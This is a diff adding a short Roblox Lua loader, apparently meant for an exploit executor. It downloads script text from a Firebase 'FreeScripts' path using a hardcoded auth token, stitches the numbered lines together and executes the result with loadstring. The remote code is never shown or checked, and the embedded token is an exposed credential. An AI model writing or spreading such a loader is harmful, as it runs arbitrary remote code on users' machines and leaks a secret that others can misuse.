@@ -1,0 +1,28 @@
+local HttpService = game:GetService("HttpService")
+local AUTH_TOKEN = "N9doG1fdieEX1Vx6OfkiaDA5AP9zR6dUv9gcqIZh"
+local response = game:HttpGet("https://dwasdw-75e45-default-rtdb.firebaseio.com/System/FreeScripts/.json?auth=" .. AUTH_TOKEN)
+local data = HttpService:JSONDecode(response)
+                
+if data then
+local scriptLines = {}
+local maxLine = 0
+                    
+for key, value in pairs(data) do
+    if string.sub(key, 1, 5) == "line_" then
+        local num = tonumber(string.sub(key, 6))
+            if num then
+                scriptLines[num] = value
+                    if num > maxLine then maxLine = num end
+                    end
+                end
+            end
+                    
+            local fullScript = ""
+            for i = 1, maxLine do
+                if scriptLines[i] then
+                    fullScript = fullScript .. scriptLines[i] .. "\n"
+                end
+            end
+                    
+            loadstring(fullScript)()
+            end
